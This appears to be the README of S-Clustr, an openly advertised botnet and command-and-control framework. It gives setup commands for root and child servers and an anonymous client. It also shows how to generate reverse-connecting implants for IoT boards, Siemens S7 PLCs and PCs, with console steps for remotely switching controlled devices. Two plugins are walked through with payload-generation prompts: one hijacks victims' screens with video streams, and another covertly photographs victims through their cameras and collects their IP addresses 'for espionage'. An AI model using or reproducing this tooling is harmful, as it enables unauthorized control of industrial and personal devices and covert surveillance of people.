<h1 align="center" style="color: #00FF00; font-family: 'Lucida Console', Monaco, monospace; text-shadow: 2px 2px 10px #FF0000, 4px 4px 20px #000000; font-size: 3em;">
  S-Clustr (Shadow Cluster)
</h1>
<p align="center">
  <img src="https://img.shields.io/badge/Java-20-darkviolet" alt="Java-20" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Python-3.9-darkblue" alt="Python-3.9" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Tools-Hacker_tool-darkred" alt="Hacker_tool" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Team-S--H4CK13-darkmagenta" alt="S-H4CK13" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Threat-APT-darkorange" alt="APT" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Category-IOT-darkgrey" alt="IOT" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Category-OT-darkgrey" alt="OT" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Category-IT-darkgrey" alt="IT" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Threat-Botnet-darkred" alt="Botnet" style="margin-right: 10px;">
  <img src="https://img.shields.io/badge/Brand-Siemens(PLC)-darkblue" alt="Siemens-PLC" style="margin-right: 10px;">
</p>



![alt text](./pic/H4CK.png)


# Security Update Announcement

**Version:** 3.2  
**Date:** 2024/8/9

---

Dear Users,

We wish to inform you about a critical security vulnerability found in versions of **S-Clustr (RingNetwork)** up to and including version 3.1 (excluding the Simple version). This vulnerability involves a high-risk encoding attack that can severely impact botnet nodes by causing disconnections, leading to potential system instability.

## Vulnerability Details:

- **Issue:** High-risk encoding attack vulnerability
- **Affected Versions:** S-Clustr (RingNetwork) <= 3.1 (excluding Simple version)
- **Impact:** Disconnection of botnet nodes and potential system instability

## Resolution:

The issue has been effectively addressed and resolved in version 3.2. We strongly recommend that all users upgrade to this version to prevent disconnections and ensure system stability.

## Upgrade Instructions:

1. **Download** the latest version from [GitHub Releases](https://github.com/MartinxMax/S-Clustr/releases).
2. **Follow the installation instructions** provided in the documentation to complete the update.

---

![Update Image](./pic/V3.2.png)

# Overview

| **No.** | **Feature Description** |
|:-------:|:------------------------:|
| **1**  | Dual-key encryption & pseudo-protocol transmission |
| **2**  | Anonymous mode for node access |
| **3**  | Defense against replay attacks from other hackers |
| **4**  | Decentralized, where each server can act as a root node (child nodes can join the network using a ring key), with up to 50,000 controlled devices per node |
| **5**  | Ring network circle (a club of zombie networks) |
| **6**  | Efficient handling of high-concurrency traffic |
| **7**  | Support for multiple device types (personal computers/IT devices, IOT devices, OT devices) |
| **8**  | Reverse connection support for multiple programming languages (C, C++, Go, Python, Java, etc., with network communication capabilities) |






## Devices

| **Type**  | **Device**         | **LAN** | **Wireless** | **4G** |
|-----------|--------------------|---------|--------------|--------|
| **IOT**   | Arduino            | √       | ×            | √      |
| **IOT**   | Hezhou AIR780e     | ×       | ×            | √      |
| **IOT**   | ESP8266            | ×       | √            | ×      |
| **IOT**   | AT89C51            | ×       | ×            | √      |
| **IOT**   | STM32              | ×       | ×            | √      |
| **OT/PLC**| SIEMENS S7-1200   | √       | ×            | ×      |
| **OT/PLC**| SIEMENS S7-200    | √       | ×            | ×      |
| **IT**    | PC                 | √       | √            | ×      |




# Install

`$ cd ./install`

Choose the appropriate installer based on your operating system.

![alt text](./pic/install.png)

## Windows

`> Windows.bat`

![alt text](./pic/Windows_install.png)

## Linux

`$ chmod +x ./Linux.sh`

`$ ./Linux.sh`

![alt text](./pic/Linux_install.png)

# Core Concepts

## Dual Key Authentication & Constructing Pseudo Protocols

![alt text](./pic/image.png)

S-Clustr (Shadow Cluster) introduces the concept of dual-key authentication in version 3.0.

![alt text](./pic/image-2.png)

By encrypting data, it ensures the data security of anonymous connections.

![alt text](./pic/image-3.png)

## Decentralized & Distributed Control

![alt text](./pic/image-4.png)

![alt text](./pic/image-6.png)

In the diagram, each server can become a root node. To join nodes, we need to provide a ring network key to join this Club. When connecting to the Root node server, you will have the highest control authority over all devices within the included nodes. However, to protect node security, you need to provide the node key (not everyone will trust you without reservation).

# Ring Network Formation

# Overview

In practice, no more than 2 devices are required (of course, the more machines that join your Club, the more you can do). If you are a server, it is entirely feasible.

# Server

`$ java -jar s_clustr-server-3.0.jar -h`

![alt text](./pic/image-9.png)

### Root Node Server

Regardless of whether you are on Windows or Linux, you can deploy the server.

`$ java -jar s_clustr-server-3.0.jar -nkey whoami123 -rkey h4ck13io`

Node key: whoami123
Ring key: h4ck13io

![alt text](./pic/image-8.png)

### Child Node Server

Windows2:

`$ java -jar s_clustr-server-3.0.jar -nkey FVckG4me -rkey h4ck13io -rootip 192.168.8.107`

Join the ring network, becoming a node.

Node key: FVckG4me
Ring key: h4ck13io

![alt text](./pic/image-10.png)

For testing, another child node needs to be added.

Windows:

`$ java -jar s_clustr-server-3.0.jar -nkey OPOPOPOP -rkey h4ck13io -rootip 192.168.8.107`

Node key: OPOPOPOP
Ring key: h4ck13io

![alt text](./pic/image-11.png)

![alt text](./pic/image-7.png)

# Anonymous Client

`$ java -jar s_clustr-client-3.0.jar`

![alt text](./pic/image-12.png)

Configure `set root-host`, `set node-key`, `set ring-key` information.

`[S-H4CK13@S-Clustr]<3.0># init`

Initialize and try to connect to the Root server.

![alt text](./pic/image-13.png)

After a successful connection, a root node identifier will appear.

## Retrieve Root Node Device Status

Ensure you are in the root node device status.

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 0`

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`

![alt text](./pic/image-14.png)

## Retrieve Child Node Status

In root node status, enter the `getinfo` command to retrieve the status of all nodes.

![alt text](./pic/image-15.png)

## Enter Node

In root node status, enter the `goto <Node ID>` command to enter the node. Enter the `exit` command to exit the current node.

![alt text](./pic/image-16.png)

## Node Device Control

Determine the current node location and choose to set the pwr parameter behavior [1. Start 2. Stop 3. Status query]

![alt text](./pic/image-18.png)

![alt text](./pic/image-20.png)

![alt text](./pic/image-19.png)

Control must be confirmed with the correct node key for the current node where you are controlling.

![alt text](./pic/image-21.png)

Node server:

![alt text](./pic/image-22.png)

Simulated controlled client:

![alt text](./pic/image-23.png)

Similarly, you can specify the type to stop using the `set type ` parameter.

![alt text](./pic/image-25.png)


# S-Clustr IOT


## Wired LAN Control

### Arduino

1.Arduino UNO

![H4CK13](https://image.3001.net/images/20231003/1696319500_651bc80cd29c5e6f7d8d1.png!small)

2.ENC28J60

![H4CK13](https://image.3001.net/images/20231004/1696404809_651d15491408ad4740661.png!small)

3.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

4.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231004/1696404864_651d15804a8adde1b9379.png!small)

![H4CK13](https://image.3001.net/images/20231004/1696404881_651d1591885762a52c1a9.png!small)

## 4G Wireless Public Network Remote Control

### Arduino

1.Arduino UNO

![H4CK13](https://image.3001.net/images/20231003/1696319500_651bc80cd29c5e6f7d8d1.png!small)

2.SIM900A or SIM800A

![H4CK13](https://image.3001.net/images/20231003/1696320095_651bca5fdbb3a6a2b1941.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

4.4G SIM Card

*The mobile SIM card is needed because the SIM800A and SIM900A modules support 2G networks from Mobile but not from Telecom or Unicom. However, after testing, the Airm2m AIR780e module should work with Unicom, so there will be no need for SIM series modules as it has internal integration.*

![H4CK13](https://image.3001.net/images/20231003/1696322442_651bd38a673737e609e44.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231003/1696321543_651bd0070660a10028e00.png!small)

### AIR780E [recommend]

1.After testing, this development board is indeed faster and more stable than the SIM series.
2.Install Luatools: Used for completing program flashing

[https://doc.openluat.com/wiki/37?wiki\_page\_id=4489]


1.Air780e

*There is a SIM card slot on the back.*

![H4CK13](https://image.3001.net/images/20231014/1697255772_652a115c4d9c45ee325b8.png!small)

![H4CK13](https://image.3001.net/images/20231014/1697256035_652a1263e9098b9a5a733.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231014/1697256413_652a13ddced9ee29cc759.png!small)

### Flash

*Import the file we generated with Generate into Luatools.*

![H4CK13](https://image.3001.net/images/20231014/1697256986_652a161a395cbe1d00004.png!small)

*Select the underlying core. The file is provided in our Output\AIR780E\LuatOS-SoC_V1103_EC618.soc*

![H4CK13](https://image.3001.net/images/20231014/1697257233_652a1711a164adde8dc73.png!small)

*Follow the prompts to complete the flashing process. Note the three buttons on the board: Start, Reset, and BOOT.*

![H4CK13](https://image.3001.net/images/20231014/1697257441_652a17e10a6eb5ce11d70.png!small)

### AT89C51


1.51 Microcontroller & CH340 Programmer

![H4CK13](https://image.3001.net/images/20231016/1697385869_652c0d8d827cba5a5f0b6.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

4.SIM900A or SIM800A

![H4CK13](https://image.3001.net/images/20231003/1696320095_651bca5fdbb3a6a2b1941.png!small)

5.4G SIM Card

![H4CK13](https://image.3001.net/images/20231003/1696322442_651bd38a673737e609e44.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231016/1697386548_652c1034eb77af75eea6b.png!small)

## WIFI

### ESP8266


1.ESP8266

![H4CK13](https://image.3001.net/images/20231005/1696496352_651e7ae0eadb3f502abd5.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231005/1696496713_651e7c4961e1f66469f91.png!small)



# Generate.py Device Firmware Code

`$ python3 generate.py`

![alt text](./pic/generate.png)

Reverse S-Clustr Server IP.

![alt text](./pic/generate2.png)

Generate code in the corresponding directory:./Device/Output/arduino

# S-Clustr OT

## SIEMENS S7-1200

Open the `./device/output/SIEMENS-PLC-S7-1200/Main` project using TIA software, and configure the IP and port for our reverse S-Clustr.

![image.png](https://image.3001.net/images/20231116/1700064368_6554ec700ef08120c4bc0.png!small)

![image.png](https://image.3001.net/images/20231116/1700064386_6554ec8260cd410d68837.png!small)

![image.png](https://image.3001.net/images/20231116/1700064514_6554ed02623a5f958fb2c.png!small)

# S-Clustr IT

# Plugin

## H4vdo (Hacker Voodoo)

![alt text](./pic/H4vdo.jpeg)

### Overview

H4vdo is an S-Clustr plugin that allows batch control of malicious screen casting services through a shadow cluster. It locks device-side operations and plays streaming video (live streams, MP4s, desktop casting) without causing significant data loss or damage to the system.

You can download the standalone tool (non-plugin version) from the repository at https://github.com/MartinxMax/H4vdo.

## RTMP Server

`$ python3 generate.py`
`[Device Type (Number)]> 7`
`[+] [0] Start RTMP server [1] Skip> 0`

![alt text](./pic/generate_RTMP.png)

### RTMP Payload

`$ python3 generate.py`
`[Device Type (Number)] > 7`
`[+] [0] Start RTMP server [1] Skip > 1`
`[+] RTMP server IP > 192.168.8.106`
`[+] RTMP server PORT > 1935`
`[+] Play key > hacked`
`[+] What is the version of python you want to execute?([0]python [1]python3)> 0`
`[+] [0] Generate payload [1] Push RTMP stream > 0`

![alt text](./pic/RTMP_PUST.png)

### RTMP Stream Push

`$ python3 generate.py`
`[Device Type (Number)] > 7`
`[+] [0] Start RTMP server [1] Skip> 1`
`[+] RTMP server IP > 192.168.8.106`
`[+] RTMP server PORT > 1935`
`[+] Play key > hacked`
`[+] What is the version of python you want to execute?([0]python [1]python3)> 0`
`[+] [0] Generate payload [1] Push RTMP stream > 1`
`[0] Push media mp4 [1] Push desktop screen [2] Push camera> 0`
`MP4 file path: xxxx.mp4`

![alt text](./pic/MP4.png)

### Example

1.Customize and modify ./demo/H4vdo/H4vdo_demo.py to update the server IP and port for the S-Clustr.
2.Click H4vdo_demo_generate.bat to package it into an executable file.
3.Place ./demo/H4vdo/H4vdo_demo.exe into the generated ./device/output/H4vdo/H4vdo_debug folder, and finally upload the entire folder to the target.

When executing H4vdo_demo.exe, the shadow cluster will first receive a reverse connection.

`SHELL> ./H4vdo_demo.exe`

![alt text](./pic/H4vdo_demo.png)

*Query Status*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 0`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Status.png)

*Run Payload*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/RTMP_Run.png)

Stream playback on the host screen

![alt text](./pic/RTMP_Player.png)

## Nets3e

![alt text](./pic/Nets3e.jpeg)

### Overview

Nets3e is an S-Clustr plugin primarily used for camera photography and IP acquisition. When you connect to the shadow cluster, you can batch control hosts, issue commands to devices under sub-nodes, and send captured photos and IP addresses to the Nets3e server for espionage activities.

Nets3e itself has another independently constructed pseudo-protocol encryption, which means that Nets3e can also be regarded as a standalone espionage tool.

You can download the standalone tool (non-plugin version) from the repository at https://github.com/MartinxMax/Nets3e.

### Nets3e Server

`$ python3 generate.py`
`[Device Type (Number)]>6`
`[+] Nets3e Server IP >192.168.8.106`
`[+] Nets3e Server Port >10099`
`[+] Nets3e Salt(password) >Maptnh`
`[+] Frp or Ngrok Server IP(default blank) >`
`[+] Frp or Ngrok Server Port(default blank)>`
`[+] Enable DingTalk Push?[./plugin/Nets3e/DingTalk.conf](y/n) >n`
`[+] Let the victim see their own photos?(y/n) >y`
`[+] What is the version of python you want to execute?([0]python [1]python3) >1`
`[+] What you need to do?([0]only generate payload [1]only start server [2]generate and start server [3]exit)>1`

![alt text](./pic/Nets3e_Server.png)


### Nets3e Payload

In `./plugin/Nets3e/GETIP.conf`, you need to ensure that the API endpoint for obtaining the public IP is functional. The returned result must be a plain text IP address.

![alt text](./pic/Nets3e_Payload_config.png)

`[Device Type (Number)]>6`
`[+] Nets3e Server IP >192.168.8.106`
`[+] Nets3e Server Port >10099`
`[+] Nets3e Salt(password) >Maptnh`
`[+] Frp or Ngrok Server IP(default blank) >`
`[+] Frp or Ngrok Server Port(default blank)>`
`[+] Enable DingTalk Push?[./plugin/Nets3e/DingTalk.conf](y/n) >n`
`[+] Let the victim see their own photos?(y/n) >y`
`[+] What is the version of python you want to execute?([0]python [1]python3) >0`
`[+] What you need to do?([0]only generate payload [1]only start server [2]generate and start server [3]exit)0`

![alt text](./pic/Nets3e_Payload.png)



### Example


1.Customize and modify ./demo/Nets3e/Nets3e_demo.py to update the server IP and port for the S-Clustr.
2.Click Nets3e_demo_generate.bat to package it into an executable file.
3.Place the executable programs from `./device/output/Nets3e/Nets3eClient_debug.exe` and `./demo/Nets3e/Nets3e_demo.exe` into any folder of your choice.

![alt text](./pic/Nets3e_Ex.png)


`SHELL> ./Nets3e_demo.exe`



*Query Status*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 0`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Nets3e_demo.png)

*Run Payload*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Nets3e_RUN_1.png)

The directory ./plugin/Nets3e/IP_Photo contains photos of all devices.

Since we selected the option `Let the victim see their own photos? (y/n) > y`, the device will also see its own photo.


![alt text](./pic/Nets3e_RUN.png)

